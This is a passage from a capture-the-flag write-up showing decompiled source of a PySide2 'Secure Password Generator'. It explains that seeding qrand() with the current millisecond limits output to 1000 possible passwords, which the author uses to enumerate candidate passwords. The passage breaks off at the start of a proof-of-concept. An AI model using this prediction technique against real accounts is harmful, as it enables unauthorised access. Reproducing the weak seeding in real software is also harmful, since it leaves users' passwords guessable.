background-color: null;
font-style: inherit;">260</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">351</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">61</span>))</span>
<span id="cb25-70">        MainWindow.setCentralWidget(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.centralwidget)</span>
<span id="cb25-71">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.statusbar <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> QStatusBar(MainWindow)</span>
<span id="cb25-72">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.statusbar.setObjectName(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'statusbar'</span>)</span>
<span id="cb25-73">        MainWindow.setStatusBar(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.statusbar)</span>
<span id="cb25-74">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.retranslateUi(MainWindow)</span>
<span id="cb25-75">        QMetaObject.connectSlotsByName(MainWindow)</span>
<span id="cb25-76"></span>
<span id="cb25-77">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">def</span> retranslateUi(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>, MainWindow):</span>
<span id="cb25-78">        MainWindow.setWindowTitle(QCoreApplication.translate(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'MainWindow'</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'MainWindow'</span>, <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">None</span>))</span>
<span id="cb25-79">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.title.setDocumentTitle(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">''</span>)</span>
<span id="cb25-80">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.title.setHtml(QCoreApplication.translate(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'MainWindow'</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd"&gt;</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\n</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">&lt;html&gt;&lt;head&gt;&lt;meta name="qrichtext" content="1" /&gt;&lt;style type="text/css"&gt;</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\n</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">p, li { white-space: pre-wrap; }</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\n</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">&lt;/style&gt;&lt;/head&gt;&lt;body style=" font-family:</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\'</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">MS Shell Dlg 2</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\'</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">; font-size:8.25pt; font-weight:400; font-style:normal;"&gt;</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\n</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">&lt;p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"&gt;&lt;span style=" font-size:20pt;"&gt;Secure Password Generator&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span>, <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">None</span>))</span>
<span id="cb25-81">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.textBrowser_2.setDocumentTitle(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">''</span>)</span>
<span id="cb25-82">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.textBrowser_2.setHtml(QCoreApplication.translate(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'MainWindow'</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd"&gt;</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\n</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">&lt;html&gt;&lt;head&gt;&lt;meta name="qrichtext" content="1" /&gt;&lt;style type="text/css"&gt;</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\n</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">p, li { white-space: pre-wrap; }</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\n</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">&lt;/style&gt;&lt;/head&gt;&lt;body style=" font-family:</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\'</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">MS Shell Dlg 2</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\'</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">; font-size:8.25pt; font-weight:400; font-style:normal;"&gt;</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\n</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">&lt;p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"&gt;&lt;span style=" font-size:14pt;"&gt;Password Length&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span>, <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">None</span>))</span>
<span id="cb25-83">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.generate.setText(QCoreApplication.translate(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'MainWindow'</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Generate!'</span>, <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">None</span>))</span>
<span id="cb25-84">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.copyButton.setText(QCoreApplication.translate(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'MainWindow'</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Copy'</span>, <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">None</span>))</span>
<span id="cb25-85">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.textBrowser_4.setDocumentTitle(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">''</span>)</span>
<span id="cb25-86">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.textBrowser_4.setHtml(QCoreApplication.translate(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'MainWindow'</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd"&gt;</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\n</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">&lt;html&gt;&lt;head&gt;&lt;meta name="qrichtext" content="1" /&gt;&lt;style type="text/css"&gt;</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\n</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">p, li { white-space: pre-wrap; }</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\n</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">&lt;/style&gt;&lt;/head&gt;&lt;body style=" font-family:</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\'</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">MS Shell Dlg 2</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\'</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">; font-size:8.25pt; font-weight:400; font-style:normal;"&gt;</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\n</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">&lt;p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"&gt;&lt;span style=" font-size:14pt;"&gt;Hide Password&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span>, <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">None</span>))</span>
<span id="cb25-87">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.checkBox.setText(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">''</span>)</span>
<span id="cb25-88">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.comboBox.setItemText(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span>, QCoreApplication.translate(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'MainWindow'</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'All Characters'</span>, <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">None</span>))</span>
<span id="cb25-89">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.comboBox.setItemText(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span>, QCoreApplication.translate(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'MainWindow'</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Alphabetic'</span>, <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">None</span>))</span>
<span id="cb25-90">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.comboBox.setItemText(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span>, QCoreApplication.translate(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'MainWindow'</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Alphanumeric'</span>, <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">None</span>))</span>
<span id="cb25-91">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.textBrowser_5.setDocumentTitle(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">''</span>)</span>
<span id="cb25-92">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.textBrowser_5.setHtml(QCoreApplication.translate(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'MainWindow'</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd"&gt;</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\n</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">&lt;html&gt;&lt;head&gt;&lt;meta name="qrichtext" content="1" /&gt;&lt;style type="text/css"&gt;</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\n</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">p, li { white-space: pre-wrap; }</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\n</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">&lt;/style&gt;&lt;/head&gt;&lt;body style=" font-family:</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\'</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">MS Shell Dlg 2</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\'</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">; font-size:8.25pt; font-weight:400; font-style:normal;"&gt;</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\n</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">&lt;p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"&gt;&lt;span style=" font-size:16pt;"&gt;characters&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span>, <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">None</span>))</span>
<span id="cb25-93">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.password_field.setText(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">''</span>)</span>
<span id="cb25-94"></span>
<span id="cb25-95"></span>
<span id="cb25-96"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">class</span> MainWindow(QMainWindow, Ui_MainWindow):</span>
<span id="cb25-97"></span>
<span id="cb25-98">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">def</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">__init__</span>(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>):</span>
<span id="cb25-99">        <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">super</span>(MainWindow, <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>).<span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">__init__</span>()</span>
<span id="cb25-100">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.setupUi(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>)</span>
<span id="cb25-101">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.setFixedSize(QSize(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">550</span>, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">400</span>))</span>
<span id="cb25-102">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.setWindowTitle(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Secure Password Generator'</span>)</span>
<span id="cb25-103">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.password_field.setReadOnly(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">True</span>)</span>
<span id="cb25-104">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.passlen()</span>
<span id="cb25-105">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.chars()</span>
<span id="cb25-106">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.hide()</span>
<span id="cb25-107">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.gen()</span>
<span id="cb25-108"></span>
<span id="cb25-109">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">def</span> passlen(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>):</span>
<span id="cb25-110">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.PasswordLength.valueChanged.<span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span>(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.lenpass)</span>
<span id="cb25-111"></span>
<span id="cb25-112">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">def</span> lenpass(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>, l):</span>
<span id="cb25-113">        <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">global</span> value</span>
<span id="cb25-114">        value <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> l</span>
<span id="cb25-115"></span>
<span id="cb25-116">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">def</span> chars(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>):</span>
<span id="cb25-117">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.comboBox.currentIndexChanged.<span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span>(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.charss)</span>
<span id="cb25-118"></span>
<span id="cb25-119">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">def</span> charss(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>, i):</span>
<span id="cb25-120">        <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">global</span> index</span>
<span id="cb25-121">        index <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> i</span>
<span id="cb25-122"></span>
<span id="cb25-123">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">def</span> hide(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>):</span>
<span id="cb25-124">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.checkBox.stateChanged.<span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span>(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.status)</span>
<span id="cb25-125"></span>
<span id="cb25-126">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">def</span> status(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>, s):</span>
<span id="cb25-127">        <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">global</span> status</span>
<span id="cb25-128">        status <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> s <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> Qt.Checked</span>
<span id="cb25-129"></span>
<span id="cb25-130">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">def</span> copy(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>):</span>
<span id="cb25-131">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.copyButton.clicked.<span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span>(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.copied)</span>
<span id="cb25-132"></span>
<span id="cb25-133">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">def</span> copied(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>):</span>
<span id="cb25-134">        pyperclip.copy(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.password_field.text())</span>
<span id="cb25-135"></span>
<span id="cb25-136">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">def</span> gen(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>):</span>
<span id="cb25-137">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.generate.clicked.<span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span>(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.genButton)</span>
<span id="cb25-138"></span>
<span id="cb25-139">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">def</span> genButton(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>):</span>
<span id="cb25-140">        <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">try</span>:</span>
<span id="cb25-141">            hide <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> status</span>
<span id="cb25-142">            <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> hide:</span>
<span id="cb25-143">                <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.password_field.setEchoMode(QLineEdit.Password)</span>
<span id="cb25-144">            <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">else</span>:</span>
<span id="cb25-145">                <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.password_field.setEchoMode(QLineEdit.Normal)</span>
<span id="cb25-146">            password <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.genPassword()</span>
<span id="cb25-147">            <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.password_field.setText(password)</span>
<span id="cb25-148">        <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">except</span>:</span>
<span id="cb25-149">            msg <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> QMessageBox()</span>
<span id="cb25-150">            msg.setWindowTitle(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Warning'</span>)</span>
<span id="cb25-151">            msg.setText(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Change the default values before generating passwords!'</span>)</span>
<span id="cb25-152">            x <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> msg.exec_()</span>
<span id="cb25-153"></span>
<span id="cb25-154">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>.copy()</span>
<span id="cb25-155"></span>
<span id="cb25-156">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">def</span> genPassword(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">self</span>):</span>
<span id="cb25-157">        length <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> value</span>
<span id="cb25-158">        char <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> index</span>
<span id="cb25-159">        <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> char <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span>:</span>
<span id="cb25-160">            charset <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+=</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">[]|:;&lt;&gt;,.?'</span></span>
<span id="cb25-161">        <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">else</span>:</span>
<span id="cb25-162">            <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> char <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span>:</span>
<span id="cb25-163">                charset <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span></span>
<span id="cb25-164">            <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">else</span>:</span>
<span id="cb25-165">                <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> char <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span>:</span>
<span id="cb25-166">                    charset <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'</span></span>
<span id="cb25-167">                <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">else</span>:</span>
<span id="cb25-168">                    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">try</span>:</span>
<span id="cb25-169">                        qsrand(QTime.currentTime().msec())</span>
<span id="cb25-170">                        password <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">''</span></span>
<span id="cb25-171">                        <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">for</span> i <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">in</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">range</span>(length):</span>
<span id="cb25-172">                            idx <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> qrand() <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">%</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">len</span>(charset)</span>
<span id="cb25-173">                            nchar <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> charset[idx]</span>
<span id="cb25-174">                            password <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">str</span>(nchar)</span>
<span id="cb25-175"></span>
<span id="cb25-176">                    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">except</span>:</span>
<span id="cb25-177">                        msg <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> QMessageBox()</span>
<span id="cb25-178">                        msg.setWindowTitle(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Error'</span>)</span>
<span id="cb25-179">                        msg.setText(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Error while generating password!, Send a message to the Author!'</span>)</span>
<span id="cb25-180">                        x <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> msg.exec_()</span>
<span id="cb25-181"></span>
<span id="cb25-182">                <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">return</span> password</span>
<span id="cb25-183"></span>
<span id="cb25-184"></span>
<span id="cb25-185"><span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">__name__</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'__main__'</span>:</span>
<span id="cb25-186">    app <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> QtWidgets.QApplication()</span>
<span id="cb25-187">    mainwindow <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> MainWindow()</span>
<span id="cb25-188">    mainwindow.show()</span>
<span id="cb25-189">    app.exec_()</span>
<span id="cb25-190"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># okay decompiling passwordGenerator.pyc</span></span></code></pre></div>
</section>
<section id="step-6" class="level3">
<h3 class="anchored" data-anchor-id="step-6">Step 6</h3>
<p>At the bottom of the script we see the function we’re after, <code>genPassword</code>, where they use a simple for-loop and a time-based randomizer for generating passwords:</p>
<div class="sourceCode" id="cb26" style="background: #f1f3f5;"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb26-1"> qsrand(QTime.currentTime().msec())</span>
<span id="cb26-2"> password <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">''</span></span>
<span id="cb26-3"> <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">for</span> i <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">in</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">range</span>(length):</span>
<span id="cb26-4">    idx <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> qrand() <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">%</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">len</span>(charset)</span>
<span id="cb26-5">    nchar <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> charset[idx]</span>
<span id="cb26-6">    password <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">str</span>(nchar)</span></code></pre></div>
<p>We can simply copy the <code>genPassword</code> function, remove all trash as we saw from <em>screenshot.png</em> that the length should be 32 and charset 0 (all characters) is used.</p>
<p>I was stuck with this script for a few hours, mainly because the product always generate 999 passwords. Debugging with <code>print()</code> and writing output to file I found that the value produced from <code>qrand()</code> isn’t that random at all and re-appear several times, even in the same pattern. Since the seed change every loop, my script would only generate 1 password per seed. Looking on the <a href="https://doc.qt.io/qtforpython-5/PySide2/QtCore/QTime.html#PySide2.QtCore.PySide2.QtCore.QTime.msec">docs</a> for <code>QTime.msec()</code> we find <code>msec()</code> will return 0 - 999, giving us a maximum of 1000 passwords generated.</p>
<p><strong>PoC to show qtime() “random” numbers:</strong></p>
<div class="sourceCode" id="cb27" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb27-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel ./genPw.py <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">tee</span> output.txt </span>
<span id="cb27-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb27-3"><span class="ex" style="color: null;
background-color: null;
